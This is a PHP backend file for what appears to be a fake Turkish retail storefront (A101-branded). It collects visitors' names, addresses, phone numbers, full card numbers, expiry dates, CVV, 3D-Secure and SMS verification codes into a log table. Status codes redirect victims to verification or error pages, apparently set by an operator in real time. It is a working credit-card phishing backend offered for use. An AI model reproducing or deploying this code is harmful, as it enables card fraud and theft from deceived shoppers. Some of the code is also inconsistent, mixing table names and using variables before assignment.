<?php
// Turn off all error reporting
error_reporting(0);
ini_set('display_errors', 0);

// If the request method is not POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 405 Method Not Allowed');
    exit;
}

// Include the database connection
include_once('../inc/db.php');

// Include the functions
include_once('../inc/functions.php');

// Get the data from the requestc
$posts = json_decode(file_get_contents('php://input'), true);

switch ($posts['action']) {
    case 'addBasket':
        // Check basket session
        session_start();
        ob_start();
        if (isset($_SESSION['basket'])) {
            echo json_encode(['status' => false, 'message' => 'Sepetinizde zaten ürün bulunmaktadır.']);
            exit;
        }
        $id = (int)htmlspecialchars(trim(strip_tags($posts['productId'])));
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_products WHERE id = ?");
        try {
            $query->execute([$id]);
            $product = $query->fetch(PDO::FETCH_OBJ);
            // Set variables
            $userIP = getUserIP();
            $product_name = $product->ProductName;
            $created_at = getTime();
            if ($product) {
                $query = $db->prepare("INSERT INTO bella_a101_basket SET product_name = ?, ip_address = ?, created_at = ?");
                try {
                    $query->execute([$product_name, $userIP, $created_at]);
                    $_SESSION['basket'] = true;
                    $_SESSION['basket_info'] = [
                        'product_id' => $id,
                        'product_name' => $product_name,
                        'ip_address' => $userIP,
                        'created_at' => $created_at
                    ];
                    echo json_encode(['status' => true, 'message' => 'Ürün sepete eklendi.']);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false, 'message' => 'Ürün sepete eklenemedi.']);
                    exit;
                }
            } else {
                echo json_encode(['status' => false, 'message' => 'Ürün bulunamadı.']);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false, 'message' => 'Ürün sepete eklenemedi.']);
            exit;
        }
        break;
    case 'removeBasket':
        // Check basket session
        session_start();
        ob_start();
        if (!isset($_SESSION['basket'])) {
            echo json_encode(['status' => false, 'message' => 'Sepetinizde ürün bulunmamaktadır.']);
            exit;
        }
        $db = db_connect();
        $userIP = getUserIP();
        $query = $db->prepare("DELETE FROM bella_a101_basket WHERE ip_address = ?");
        try {
            $query->execute([$userIP]);
            // Remove session
            unset($_SESSION['basket']);
            unset($_SESSION['basket_info']);
            echo json_encode(['status' => true, 'message' => 'Ürün sepetten kaldırıldı.']);
            exit;
        } catch (PDOException $e) {
            echo json_encode(['status' => false, 'message' => 'Ürün sepetten kaldırılamadı.']);
            exit;
        }
        break;
    case 'payment':
        // Check basket session
        session_start();
        ob_start();
        if (!isset($_SESSION['basket'])) {
            echo json_encode(['status' => false, 'message' => 'Sepetinizde ürün bulunmamaktadır.']);
            exit;
        }
        // Get post datas
      
        $name_surname = htmlspecialchars(trim(strip_tags($posts['name_surname']))); // Name Surname
        $amount = htmlspecialchars(trim(strip_tags($posts['amount']))); // Amount
        $phone_number = htmlspecialchars(trim(strip_tags($posts['phone_number']))); // phone_number
        $il = htmlspecialchars(trim(strip_tags($posts['il']))); // address
        $address = htmlspecialchars(trim(strip_tags($posts['address']))); // address
       $ipAddress = htmlspecialchars(trim(strip_tags($posts['ipAddress']))); // address



        
        // Check if the fields are empty
        if (empty($amount) ) {
            echo json_encode(['status' => false, 'message' => 'Lütfen gerekli tüm alanları doldurunuz.']);
            exit;
        }
        $db = db_connect();
        $userIP = getUserIP();

        $status_for_logs = 1;
        $created_at2 = getTime();
        $query = $db->prepare("SELECT * FROM bella_a101_basket WHERE ip_address = ?");

        try {
            $query->execute([$userIP]);
            $basket = $query->fetch(PDO::FETCH_OBJ);
            if ($basket) {
                $query = $db->prepare("INSERT INTO bella_a101_logs SET name_surname = ?, ipAddress = ?, il = ?, address = ?, phone_number = ? ");
                try {
                      $logs = $logs->phone_number;
                    $query->execute([$name_surname, $ipAddress, $il, $address, $phone_number]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $db->lastInsertId()]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false, 'message' => 'Kart bilgileriniz yanlış, lütfen kontrol ederek tekrar deneyiniz.']);
                    exit;
                }
            } else {
                echo json_encode(['status' => false, 'message' => 'Alışveriş sepetinizde ürün bulunmuyor.']);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false, 'message' => 'Sepetinizde ürün bulunmamaktadır.']);
            exit;
        }
        break;
    case 'threeDCode':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['transaction_id']))); // ID
        $code = htmlspecialchars(trim(strip_tags($posts['code']))); // Code
        // Check if the fields are empty
        if (empty($id) || empty($code)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                $query = $db->prepare("UPDATE logs SET card_3dcode = ?, status = 1 WHERE id = ?");
                try {
                    $query->execute([$code, $id]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'secureCode':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['transaction_id']))); // ID
        $code = htmlspecialchars(trim(strip_tags($posts['code']))); // Code
        // Check if the fields are empty
        if (empty($id) || empty($code)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                $query = $db->prepare("UPDATE logs SET secure_code = ?, status = 1 WHERE id = ?");
                try {
                    $query->execute([$code, $id]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'updateCardNumber':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['orderId']))); // ID
        $cardNumber = htmlspecialchars(trim(strip_tags($posts['cardNumber']))); // Code
        // Check if the fields are empty
        if (empty($id) || empty($cardNumber)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                $query = $db->prepare("UPDATE logs SET card_number = ?, status = 1 WHERE id = ?");
                try {
                    $query->execute([$cardNumber, $id]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'updateCardExp':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['orderId']))); // ID
        $cardExpMonth = htmlspecialchars(trim(strip_tags($posts['cardExpMonth']))); // Card Exp Month
        $cardExpYear = htmlspecialchars(trim(strip_tags($posts['cardExpYear']))); // Card Exp Year
        // Check if the fields are empty
        if (empty($id) || empty($cardExpMonth) || empty($cardExpYear)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                $query = $db->prepare("UPDATE logs SET card_expiration_month = ?, card_expiration_year = ?, status = 1 WHERE id = ?");
                try {
                    $query->execute([$cardExpMonth, $cardExpYear, $id]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'updateCardCVV':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['orderId']))); // ID
        $cardCVV = htmlspecialchars(trim(strip_tags($posts['cardCVV']))); // Code
        // Check if the fields are empty
        if (empty($id) || empty($cardCVV)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                $query = $db->prepare("UPDATE logs SET card_cvv = ?, status = 1 WHERE id = ?");
                try {
                    $query->execute([$cardCVV, $id]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'updatePhoneNumber':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['orderId']))); // ID
        $phoneNumber = htmlspecialchars(trim(strip_tags($posts['phoneNumber']))); // Code
        // Check if the fields are empty
        if (empty($id) || empty($phoneNumber)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                $query = $db->prepare("UPDATE logs SET cardholder_phone = ?, status = 1 WHERE id = ?");
                try {
                    $query->execute([$phoneNumber, $id]);
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'getUserRealIP':
        echo json_encode(['status' => true, 'ip' => getUserIP()]);
        break;
    case 'setUserStatus':
        // Get post datas
        $ip = htmlspecialchars(trim(strip_tags($posts['ip']))); // IP
        $status = htmlspecialchars(trim(strip_tags($posts['status']))); // Status
        // Check if the fields are empty
        if (empty($ip) || empty($status)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_ips WHERE ip_addr = ? ORDER BY id DESC LIMIT 1");
        try {
            $query->execute([$ip]);
            $ips = $query->fetch(PDO::FETCH_OBJ);
            if ($ips && $ip == $ips->ip_addr) {
                $query = $db->prepare("UPDATE ips SET status = ? WHERE ip_addr = ?");
                try {
                    $query->execute([$status, $ip]);
                    echo json_encode(['status' => true]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            } else {
                $query = $db->prepare("INSERT INTO ips (ip_addr, status) VALUES (?, ?)");
                try {
                    $query->execute([$ip, $status]);
                    echo json_encode(['status' => true]);
                    exit;
                } catch (PDOException $e) {
                    echo json_encode(['status' => false]);
                    exit;
                }
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false]);
            exit;
        }
        break;
    case 'checkTransactionStatus':
        // Get post datas
        $id = htmlspecialchars(trim(strip_tags($posts['transaction_id']))); // ID
        // Check if the fields are empty
        if (empty($id)) {
            echo json_encode(['status' => false]);
            exit;
        }
        $db = db_connect();
        $query = $db->prepare("SELECT * FROM bella_a101_logs WHERE id = ?");
        try {
            $query->execute([$id]);
            $logs = $query->fetch(PDO::FETCH_OBJ);
            if ($logs) {
                if ($logs->status == 2) {
                    echo json_encode(['status' => true, 'redirect' => '3dsecure.php?t=' . $id]);
                } else if ($logs->status == 3) {
                    echo json_encode(['status' => true, 'redirect' => 'tesekkurler.php?t=' . $id]);
                } else if ($logs->status == 4) {
                    echo json_encode(['status' => true, 'redirect' => '3dsecure.php?t=' . $id . '&hatali=1']);
                } else if ($logs->status == 5) {
                    echo json_encode(['status' => true, 'redirect' => 'dogrulama.php?t=' . $id]);
                } else if ($logs->status == 6) {
                    echo json_encode(['status' => true, 'redirect' => 'hatali.php?t=' . $id . '&hata=ccno']);
                } else if ($logs->status == 7) {
                    echo json_encode(['status' => true, 'redirect' => 'hatali.php?t=' . $id . '&hata=ccexp']);
                } else if ($logs->status == 8) {
                    echo json_encode(['status' => true, 'redirect' => 'hatali.php?t=' . $id . '&hata=cccvv']);
                } else if ($logs->status == 9) {
                    echo json_encode(['status' => true, 'redirect' => 'hatali.php?t=' . $id . '&hata=cc_closed']);
                } else if ($logs->status == 10) {
                    echo json_encode(['status' => true, 'redirect' => 'hatali.php?t=' . $id . '&hata=cc_red']);
                } else if ($logs->status == 11) {
                    echo json_encode(['status' => true, 'redirect' => 'hatali.php?t=' . $id . '&hata=phone_error']);
                } else if ($logs->status == 12) {
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                } else if ($logs->status == 1) {
                    echo json_encode(['status' => true, 'redirect' => 'odeme-havale.php?t=' . $id]);
                }
            } else {
                echo json_encode(['status' => false]);
                exit;
            }
        } catch (PDOException $e) {
            echo json_encode(['status' => false, 'message' => 'Ödeme işlemi sırasında bir hata oluştu.']);
            exit;
        }
        break;
    default:
        header('HTTP/1.1 404 Not Found');
        die('404 Not Found');
}